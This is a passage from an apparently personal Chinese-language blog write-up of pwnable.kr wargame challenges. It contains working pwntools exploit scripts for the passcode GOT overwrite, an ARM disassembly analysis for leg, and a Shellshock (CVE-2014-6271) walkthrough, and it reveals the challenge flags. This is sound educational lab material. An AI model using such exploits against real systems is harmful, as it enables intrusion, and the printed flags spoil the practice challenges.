client.recvuntil(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter you name : ")</span></span><br><span class="line"></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=<span class="string">"11111111"</span>*<span class="number">12</span></span><br><span class="line">context+=p32(<span class="number">0x0804a004</span>)</span><br><span class="line">client.sendline(context) </span><br><span class="line"><span class="comment">#print client.recvuntil("enter passcode1 : \n")</span></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=</span><br><span class="line">client.sendline(context)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter passcode2 : \n")</span></span><br><span class="line"></span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p>就是跑不通，一度以为是参数没传进去:(</p>
<h4 id="借鉴-1"><a href="#借鉴-1" class="headerlink" title="借鉴"></a>借鉴</h4><p>在网上找了别人的wp，才发现关键在于passcode1是int类型，所以把passcode改为10进制才行。</p>
<h4 id="脚本1-1"><a href="#脚本1-1" class="headerlink" title="脚本1.1"></a>脚本1.1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"/home/apple/calc/test/passcode"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'passcode'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>).process(<span class="string">"./passcode"</span>)</span><br><span class="line"><span class="keyword">print</span> client.recvuntil(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter you name : ")</span></span><br><span class="line"></span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=<span class="string">"11111111"</span>*<span class="number">12</span></span><br><span class="line">context+=p32(<span class="number">0x0804a004</span>)</span><br><span class="line">client.sendline(context) </span><br><span class="line"><span class="comment">#print client.recvuntil("enter passcode1 : \n")</span></span><br><span class="line">context=<span class="string">"134514147"</span></span><br><span class="line">client.sendline(context)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter passcode2 : \n")</span></span><br><span class="line"></span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p>成功！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag</span></span><br><span class="line">Sorry mom.. I got confused about <span class="built_in">scanf</span> usage :(</span><br></pre></td></tr></table></figure>

<h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p>看别人的wp学到一种新操作，不用手查got表了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin = ELF(<span class="string">'./passcode'</span>)</span><br><span class="line">cn.sendline(<span class="string">'a'</span>*<span class="number">96</span>+p32(bin.got[<span class="string">'fflush'</span>]))</span><br></pre></td></tr></table></figure>

<h4 id="脚本1-2"><a href="#脚本1-2" class="headerlink" title="脚本1.2"></a>脚本1.2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	client=process(<span class="string">"/home/apple/calc/test/passcode"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	client = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'passcode'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>).process(<span class="string">"./passcode"</span>)</span><br><span class="line"><span class="keyword">print</span> client.recvuntil(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter you name : ")</span></span><br><span class="line">bin = ELF(<span class="string">'./passcode'</span>)</span><br><span class="line">context=<span class="string">""</span></span><br><span class="line">context+=<span class="string">"11111111"</span>*<span class="number">12</span></span><br><span class="line">context+=p32(bin.got[<span class="string">'fflush'</span>])</span><br><span class="line">client.sendline(context)</span><br><span class="line"><span class="comment">#print client.recvuntil("enter passcode1 : \n")</span></span><br><span class="line">context=<span class="string">"134514147"</span></span><br><span class="line">client.sendline(context)</span><br><span class="line">client.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h4 id="思路2-0"><a href="#思路2-0" class="headerlink" title="思路2.0"></a>思路2.0</h4><p>本题有两处没有取参数地址的scanf，虽然只利用了第一处就可以把题目做出来了，但是出题人原本的意思可能是想让做题人将两个passcode都改为正确的值，然后成功通过判断语句拿到flag。</p>
<p>仔细算了一下，name位于ebp-0x70，而password1位于ebp-0x10：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630005727.png" alt=""></p>
<p>password2位于ebp-0xc：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190630012522.png" alt=""></p>
<p>name有100(0x64)字节长，正好覆盖password1而覆盖不到password2。</p>
<p>所以俩scanf都用起来可能不太现实。</p>
<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>不知道为什么脚本接受不到”enter you name : “以及之后的字符串，不过接受不到也不影响做题:)</p>
<h3 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"push	&#123;r6&#125;\n"</span></span><br><span class="line">	<span class="string">"add	r6, pc, $1\n"</span></span><br><span class="line">	<span class="string">"bx	r6\n"</span></span><br><span class="line">	<span class="string">".code   16\n"</span></span><br><span class="line">	<span class="string">"mov	r3, pc\n"</span></span><br><span class="line">	<span class="string">"add	r3, $0x4\n"</span></span><br><span class="line">	<span class="string">"push	&#123;r3&#125;\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;pc&#125;\n"</span></span><br><span class="line">	<span class="string">".code	32\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;r6&#125;\n"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line">	<span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		<span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">		<span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">		write(<span class="number">0</span>, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x00008d3c</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   <span class="number">0x00008d40</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">8</span></span><br><span class="line">   <span class="number">0x00008d44</span> &lt;+<span class="number">8</span>&gt;:	sub	sp, sp, #<span class="number">12</span></span><br><span class="line">   <span class="number">0x00008d48</span> &lt;+<span class="number">12</span>&gt;:	mov	r3, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d4c</span> &lt;+<span class="number">16</span>&gt;:	str	r3, [r11, #<span class="number">-16</span>]</span><br><span class="line">   <span class="number">0x00008d50</span> &lt;+<span class="number">20</span>&gt;:	ldr	r0, [pc, #<span class="number">104</span>]	; <span class="number">0x8dc0</span> &lt;main+<span class="number">132</span>&gt;</span><br><span class="line">   <span class="number">0x00008d54</span> &lt;+<span class="number">24</span>&gt;:	bl	<span class="number">0xfb6c</span> &lt;<span class="built_in">printf</span>&gt;</span><br><span class="line">   <span class="number">0x00008d58</span> &lt;+<span class="number">28</span>&gt;:	sub	r3, r11, #<span class="number">16</span></span><br><span class="line">   <span class="number">0x00008d5c</span> &lt;+<span class="number">32</span>&gt;:	ldr	r0, [pc, #<span class="number">96</span>]	; <span class="number">0x8dc4</span> &lt;main+<span class="number">136</span>&gt;</span><br><span class="line">   <span class="number">0x00008d60</span> &lt;+<span class="number">36</span>&gt;:	mov	r1, r3</span><br><span class="line">   <span class="number">0x00008d64</span> &lt;+<span class="number">40</span>&gt;:	bl	<span class="number">0xfbd8</span> &lt;__isoc99_scanf&gt;</span><br><span class="line">   <span class="number">0x00008d68</span> &lt;+<span class="number">44</span>&gt;:	bl	<span class="number">0x8cd4</span> &lt;key1&gt;</span><br><span class="line">   <span class="number">0x00008d6c</span> &lt;+<span class="number">48</span>&gt;:	mov	r4, r0</span><br><span class="line">   <span class="number">0x00008d70</span> &lt;+<span class="number">52</span>&gt;:	bl	<span class="number">0x8cf0</span> &lt;key2&gt;</span><br><span class="line">   <span class="number">0x00008d74</span> &lt;+<span class="number">56</span>&gt;:	mov	r3, r0</span><br><span class="line">   <span class="number">0x00008d78</span> &lt;+<span class="number">60</span>&gt;:	add	r4, r4, r3</span><br><span class="line">   <span class="number">0x00008d7c</span> &lt;+<span class="number">64</span>&gt;:	bl	<span class="number">0x8d20</span> &lt;key3&gt;</span><br><span class="line">   <span class="number">0x00008d80</span> &lt;+<span class="number">68</span>&gt;:	mov	r3, r0</span><br><span class="line">   <span class="number">0x00008d84</span> &lt;+<span class="number">72</span>&gt;:	add	r2, r4, r3</span><br><span class="line">   <span class="number">0x00008d88</span> &lt;+<span class="number">76</span>&gt;:	ldr	r3, [r11, #<span class="number">-16</span>]</span><br><span class="line">   <span class="number">0x00008d8c</span> &lt;+<span class="number">80</span>&gt;:	cmp	r2, r3</span><br><span class="line">   <span class="number">0x00008d90</span> &lt;+<span class="number">84</span>&gt;:	bne	<span class="number">0x8da8</span> &lt;main+<span class="number">108</span>&gt;</span><br><span class="line">   <span class="number">0x00008d94</span> &lt;+<span class="number">88</span>&gt;:	ldr	r0, [pc, #<span class="number">44</span>]	; <span class="number">0x8dc8</span> &lt;main+<span class="number">140</span>&gt;</span><br><span class="line">   <span class="number">0x00008d98</span> &lt;+<span class="number">92</span>&gt;:	bl	<span class="number">0x1050c</span> &lt;<span class="built_in">puts</span>&gt;</span><br><span class="line">   <span class="number">0x00008d9c</span> &lt;+<span class="number">96</span>&gt;:	ldr	r0, [pc, #<span class="number">40</span>]	; <span class="number">0x8dcc</span> &lt;main+<span class="number">144</span>&gt;</span><br><span class="line">   <span class="number">0x00008da0</span> &lt;+<span class="number">100</span>&gt;:	bl	<span class="number">0xf89c</span> &lt;system&gt;</span><br><span class="line">   <span class="number">0x00008da4</span> &lt;+<span class="number">104</span>&gt;:	b	<span class="number">0x8db0</span> &lt;main+<span class="number">116</span>&gt;</span><br><span class="line">   <span class="number">0x00008da8</span> &lt;+<span class="number">108</span>&gt;:	ldr	r0, [pc, #<span class="number">32</span>]	; <span class="number">0x8dd0</span> &lt;main+<span class="number">148</span>&gt;</span><br><span class="line">   <span class="number">0x00008dac</span> &lt;+<span class="number">112</span>&gt;:	bl	<span class="number">0x1050c</span> &lt;<span class="built_in">puts</span>&gt;</span><br><span class="line">   <span class="number">0x00008db0</span> &lt;+<span class="number">116</span>&gt;:	mov	r3, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008db4</span> &lt;+<span class="number">120</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008db8</span> &lt;+<span class="number">124</span>&gt;:	sub	sp, r11, #<span class="number">8</span></span><br><span class="line">   <span class="number">0x00008dbc</span> &lt;+<span class="number">128</span>&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   <span class="number">0x00008dc0</span> &lt;+<span class="number">132</span>&gt;:	andeq	r10, r6, r12, lsl #<span class="number">9</span></span><br><span class="line">   <span class="number">0x00008dc4</span> &lt;+<span class="number">136</span>&gt;:	andeq	r10, r6, r12, lsr #<span class="number">9</span></span><br><span class="line">   <span class="number">0x00008dc8</span> &lt;+<span class="number">140</span>&gt;:			; &lt;UNDEFINED&gt; instruction: <span class="number">0x0006a4b0</span></span><br><span class="line">   <span class="number">0x00008dcc</span> &lt;+<span class="number">144</span>&gt;:			; &lt;UNDEFINED&gt; instruction: <span class="number">0x0006a4bc</span></span><br><span class="line">   <span class="number">0x00008dd0</span> &lt;+<span class="number">148</span>&gt;:	andeq	r10, r6, r4, asr #<span class="number">9</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key1:</span><br><span class="line">   <span class="number">0x00008cd4</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cd8</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008cdc</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, pc</span><br><span class="line">   <span class="number">0x00008ce0</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008ce4</span> &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008ce8</span> &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008cec</span> &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key2:</span><br><span class="line">   <span class="number">0x00008cf0</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cf4</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008cf8</span> &lt;+<span class="number">8</span>&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cfc</span> &lt;+<span class="number">12</span>&gt;:	add	r6, pc, #<span class="number">1</span></span><br><span class="line">   <span class="number">0x00008d00</span> &lt;+<span class="number">16</span>&gt;:	bx	r6</span><br><span class="line">   <span class="number">0x00008d04</span> &lt;+<span class="number">20</span>&gt;:	mov	r3, pc</span><br><span class="line">   <span class="number">0x00008d06</span> &lt;+<span class="number">22</span>&gt;:	adds	r3, #<span class="number">4</span></span><br><span class="line">   <span class="number">0x00008d08</span> &lt;+<span class="number">24</span>&gt;:	push	&#123;r3&#125;</span><br><span class="line">   <span class="number">0x00008d0a</span> &lt;+<span class="number">26</span>&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   <span class="number">0x00008d0c</span> &lt;+<span class="number">28</span>&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d10</span> &lt;+<span class="number">32</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008d14</span> &lt;+<span class="number">36</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d18</span> &lt;+<span class="number">40</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d1c</span> &lt;+<span class="number">44</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key3:</span><br><span class="line">   <span class="number">0x00008d20</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008d24</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d28</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, lr</span><br><span class="line">   <span class="number">0x00008d2c</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008d30</span> &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d34</span> &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d38</span> &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>scp居然下载不下来，看来只能瞪眼看了。</p>
<p>题目让key的值最终等于key1() key2() key3()这仨函数的返回值之和</p>
<h5 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h5><p>（ARM用r0传递返回值，pc指向当前指令（正在执行）+2*（指令长度）处）</p>
<p>返回值r0来自于r3</p>
<p>r3的值来自于pc</p>
<p>寄存器pc（r15）在arm状态下（指令长度为4，RISC等长指令集），总是指向当前指令（正在执行）+2*（指令长度）处，这里执行了0x00008cdc后，r3为0x00008ce4。</p>
<h5 id="key2"><a href="#key2" class="headerlink" title="key2"></a>key2</h5><p>（指令最后一位用于做标志位，bx跳转时if地址最后一位是0-&gt;arm状态(4字节指令），1-&gt;thumb状态(2字节指令））</p>
<p>r0来自于r3</p>
<p>r3 = pc(0x00008d08)+2*2=0x00008d0c</p>
<p>注意：</p>
<ol>
<li>key2+8处程序一开始保存了r6，则说明r6会被后面的指令用到。</li>
<li>key2+12处r6变为0x00008d05。</li>
<li>key2+16处bx跳转到key+20（指令地址会先和0xFFFFFFFE进行按位与，因为最后一位肯定是0，因此最后一位用于做标志位，bx执行时如果地址最后一位是0，表示跳到arm状态，1则跳到thumb态），因为地址最低位是1，所以切换为thumb状态。(thumb状态每条指令是2字节长，arm状态每条指令是4字节长)。</li>
<li>最后把r3给r0作为返回值，也就是0x00008d0c。此后通过bx跳回main（此前bl指令将pc-4存在lr中）时，状态又换为arm。</li>
</ol>
<h5 id="key3"><a href="#key3" class="headerlink" title="key3"></a>key3</h5><p>（LR保存调用函数时PC下一次要执行的地址）</p>
<p>r0来自于r3</p>
<p>r3 来自于lr</p>
<p>此处lr是<code>0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;</code>处pc-4的地址0x00008d80</p>
<p>注意：</p>
<p>ARM是三级流水线的：取指，译码，执行。</p>
<p>ARM的R15(PC)总是指向取指的地方（不过分析时我们总是以执行作为分析参考点）。</p>
<p>而LR指向PC下一次要执行的地址</p>
<blockquote>
<p>LR is <a href="http://en.wikipedia.org/wiki/Link_register" target="_blank" rel="noopener">link register</a> used to hold the return address for a function call.</p>
</blockquote>
<p>PC和LR关系如下图所示</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190719113055.png" alt=""></p>
<h5 id="key"><a href="#key" class="headerlink" title="key"></a>key</h5><p>0x00008d80+0x00008d0c+0x00008ce4=108400</p>
<h4 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h4><p>X86是复杂指令集（CISC）的代表，而ARM则是精简指令集（RISC）的代表</p>
<p>平时一般用的都是X86</p>
<p>但这些背是背不过了，还是考察搜索引擎的使用呗。</p>
<h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目里写着</p>
<blockquote>
<p>Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)</p>
</blockquote>
<p>那你可赌输了:)</p>
<h4 id="查资料"><a href="#查资料" class="headerlink" title="查资料"></a>查资料</h4><p>搜到一篇写得特别好玩的shellshock原理</p>
<h4 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h4><p>目录里有个bash，是要攻击的对象（做了半天才意识到这一点）</p>
<p>查看该bash的版本，正好是有漏洞的4.2版本</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704224155.png" alt=""></p>
<p>尝试一下，发现存在任意代码执行漏洞</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704225446.png" alt=""></p>
<p>执行cat flag，拿到flag</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704225356.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//flag</span><br><span class="line">only <span class="keyword">if</span> I knew CVE-2014-6271 ten years ago..!!</span><br></pre></td></tr></table></figure>

<p>不过说实话，拿到flag后我也不知道这个flag是怎么拿到的。</p>
<p>在网上搜了一下suid euid ruid的知识，没找到写得明明白白的。</p>
<p>我理解的就是，如果这个文件的权限用s替代x的话，那么其他用户就可以 通过set suid的方式来获取该文件所有者的权限 / 通过set sgid的方式来获取该文件所在组的权限，并用获取的权限来执行文件。</p>
<p>对于本题来说，查看一下文件的权限，可以看到文件shellshock所在组的权限里有s。</p>
<!-- 此处附上ls -l各列含义表 -->

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190705000101.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190705000655.png" alt=""></p>
<p>然后回看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setresuid(getegid(), getegid(), getegid());</span><br><span class="line">setresgid(getegid(), getegid(), getegid());</span><br></pre></td></tr></table></figure>

<p>程序把该进程的ruid、euid、suid统统设成了getegid()也就是shellshock_pwn这个组的id，</p>
<p>而shellshock_pwn这个组对flag有read权限。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190705002540.png" alt=""></p>
<h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h4><p>按理说env和export应该都可以用来定义export的环境变量，但是实际上env并不可以</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190704224918.png" alt=""></p>
